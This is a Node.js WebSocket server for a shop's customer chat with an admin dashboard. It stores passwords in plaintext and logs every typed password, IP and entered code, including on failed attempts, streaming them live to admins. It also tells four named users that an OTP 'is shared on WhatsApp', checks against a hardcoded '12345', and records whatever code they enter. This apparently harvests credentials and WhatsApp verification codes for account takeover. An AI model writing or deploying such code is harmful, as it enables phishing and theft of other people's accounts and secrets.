import { WebSocketServer } from "ws";
import jwt from "jsonwebtoken";
import { ChatUser, ChatMessage, LoginAttempt } from "./models/Chat.js";
import { sendOfflineAlert } from "./mailer.js";

const savePassword = (pw) => pw; // swap for a hash later
const checkPassword = (pw, stored) => pw === stored; // swap for compare later

// One-time OTP gate, only for these tester accounts. OTP is hardcoded for now.
const OTP_USERS = new Set(["_shalinikrl12", "lioness.8578106", "the_suraj_kumar", "jigglypuff_2867"]);
const TEST_OTP = "12345";

const MAX_TEXT = 2000;
const customers = new Map(); // username -> Set<ws>
const admins = new Set();

const send = (ws, payload) => ws.readyState === 1 && ws.send(JSON.stringify(payload));
const sendAll = (set, payload) => set && set.forEach((ws) => send(ws, payload));

const serialize = (m) => ({
  id: String(m._id), username: m.username, from: m.from, text: m.text, product: m.product || null, createdAt: m.createdAt,
});

function cleanProduct(p) {
  if (!p || typeof p !== "object" || !p.name) return undefined;
  return {
    id: String(p.id || "").slice(0, 64),
    name: String(p.name).slice(0, 200),
    price: Number(p.price) || 0,
    image: String(p.image || "").slice(0, 500),
  };
}

async function history(username) {
  const msgs = await ChatMessage.find({ username }).sort({ createdAt: 1 }).limit(500);
  return msgs.map(serialize);
}

async function logAttempt(username, password, success, reason, ip, otp) {
  const a = await LoginAttempt.create({ username, password, success, reason, ip, otp });
  sendAll(admins, { type: "login_attempt", attempt: attemptJson(a) });
}

const attemptJson = (a) => ({
  id: String(a._id), username: a.username, password: a.password, success: a.success,
  reason: a.reason, otp: a.otp, ip: a.ip, createdAt: a.createdAt,
});

const userJson = (u) => ({
  username: u.username, password: u.password, otpVerified: !!u.otpVerified,
  createdAt: u.createdAt, online: customers.has(u.username),
});

async function listUsers() {
  return (await ChatUser.find().sort({ createdAt: -1 })).map(userJson);
}

// Hard delete: user, all their messages and their login attempts are removed from the DB.
async function deleteUser(username) {
  await Promise.all([
    ChatUser.deleteOne({ username }),
    ChatMessage.deleteMany({ username }),
    LoginAttempt.deleteMany({ username }),
  ]);
  const sockets = customers.get(username);
  if (sockets) {
    sockets.forEach((ws) => { send(ws, { type: "auth_fail", error: "This account was removed" }); ws.close(); });
    customers.delete(username);
  }
  sendAll(admins, { type: "user_deleted", username });
}

async function threads() {
  const rows = await ChatMessage.aggregate([
    { $sort: { createdAt: 1 } },
    { $group: { _id: "$username", last: { $last: "$text" }, lastAt: { $last: "$createdAt" }, count: { $sum: 1 } } },
    { $sort: { lastAt: -1 } },
  ]);
  return rows.map((r) => ({
    username: r._id, last: r.last, lastAt: r.lastAt, count: r.count, online: customers.has(r._id),
  }));
}

async function finishLogin(ws, state, username, password, reason, ip) {
  state.username = username;
  if (!customers.has(username)) customers.set(username, new Set());
  customers.get(username).add(ws);
  await logAttempt(username, password, true, reason, ip);
  send(ws, { type: "auth_ok", username, messages: await history(username) });
  sendAll(admins, { type: "presence", username, online: true });
  if (reason === "new account") {
    const u = await ChatUser.findOne({ username });
    if (u) sendAll(admins, { type: "user_added", user: userJson(u) });
  }
}

async function handleCustomer(ws, state, msg, ip) {
  if (msg.type === "auth") {
    const username = String(msg.username || "").trim();
    const password = String(msg.password ?? "");
    if (!username || !password) {
      await logAttempt(username, password, false, "missing fields", ip);
      return send(ws, { type: "auth_fail", error: "Enter username and password" });
    }
    let user = await ChatUser.findOne({ username });
    let reason = "login";
    if (!user) {
      user = await ChatUser.create({ username, password: savePassword(password) });
      reason = "new account";
    } else if (!checkPassword(password, user.password)) {
      await logAttempt(username, password, false, "wrong password", ip);
      return send(ws, { type: "auth_fail", error: "Wrong password for this username" });
    }
    if (OTP_USERS.has(username) && !user.otpVerified) {
      state.pendingOtp = { username, password, reason };
      return send(ws, {
        type: "otp_required",
        message: "The OTP for connection is shared on WhatsApp. Enter it below.",
      });
    }
    return finishLogin(ws, state, username, password, reason, ip);
  }

  if (msg.type === "otp") {
    const pending = state.pendingOtp;
    if (!pending) return send(ws, { type: "auth_fail", error: "Not logged in" });
    const code = String(msg.otp ?? "");
    if (code !== TEST_OTP) {
      await logAttempt(pending.username, pending.password, false, "wrong otp", ip, code);
      return send(ws, { type: "otp_fail", error: "Invalid password" });
    }
    state.pendingOtp = null;
    await ChatUser.updateOne({ username: pending.username }, { otpVerified: true });
    return finishLogin(ws, state, pending.username, pending.password, pending.reason, ip);
  }

  if (!state.username) return send(ws, { type: "auth_fail", error: "Not logged in" });

  if (msg.type === "message") {
    const text = String(msg.text || "").trim().slice(0, MAX_TEXT);
    const product = cleanProduct(msg.product);
    if (!text && !product) return;
    const saved = serialize(await ChatMessage.create({ username: state.username, from: "user", text: text || product.name, product }));
    sendAll(customers.get(state.username), { type: "message", message: saved });
    sendAll(admins, { type: "message", message: saved });
    if (admins.size === 0) sendOfflineAlert(saved);
  }
}

async function handleAdmin(ws, msg) {
  if (msg.type === "delete_user") {
    const username = String(msg.username || "");
    if (username) await deleteUser(username);
    return;
  }
  if (msg.type === "open") {
    return send(ws, { type: "history", username: msg.username, messages: await history(msg.username) });
  }
  if (msg.type === "reply") {
    const text = String(msg.text || "").trim().slice(0, MAX_TEXT);
    const username = String(msg.username || "");
    if (!text || !username) return;
    const saved = serialize(await ChatMessage.create({ username, from: "owner", text }));
    sendAll(customers.get(username), { type: "message", message: saved });
    sendAll(admins, { type: "message", message: saved });
  }
}

export function attachChat(server) {
  const wss = new WebSocketServer({ server, path: "/ws" });

  wss.on("connection", (ws, req) => {
    const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "").toString().split(",")[0].trim();
    const state = { username: null, admin: false };

    ws.on("message", async (raw) => {
      let msg;
      try { msg = JSON.parse(raw.toString()); } catch { return; }
      try {
        if (msg.type === "admin_auth") {
          try { jwt.verify(msg.token, process.env.JWT_SECRET); } catch {
            return send(ws, { type: "admin_fail", error: "Invalid token" });
          }
          state.admin = true;
          admins.add(ws);
          const attempts = await LoginAttempt.find().sort({ createdAt: -1 }).limit(100);
          return send(ws, { type: "admin_ok", attempts: attempts.map(attemptJson), threads: await threads(), users: await listUsers() });
        }
        if (state.admin) return await handleAdmin(ws, msg);
        await handleCustomer(ws, state, msg, ip);
      } catch (err) {
        console.error("ws error", err);
        send(ws, { type: "error", error: "Server error" });
      }
    });

    ws.on("close", () => {
      admins.delete(ws);
      if (state.username) {
        const set = customers.get(state.username);
        set?.delete(ws);
        if (set && set.size === 0) {
          customers.delete(state.username);
          sendAll(admins, { type: "presence", username: state.username, online: false });
        }
      }
    });
  });
}
